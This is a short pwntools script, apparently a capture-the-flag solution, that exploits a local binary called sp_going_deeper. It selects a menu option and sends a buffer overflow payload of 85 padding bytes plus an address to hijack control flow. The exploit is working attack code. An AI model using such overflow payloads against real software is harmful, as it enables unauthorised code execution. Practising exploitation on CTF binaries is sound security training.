from pwn import *

io = process('./sp_going_deeper')

io.recvuntil('>> ')
io.sendline('1')
io.recvuntil('[*] Input: ')

payload = 'A'*(85) + p64(0x400b12)
io.sendline(payload)
print io.recvall()
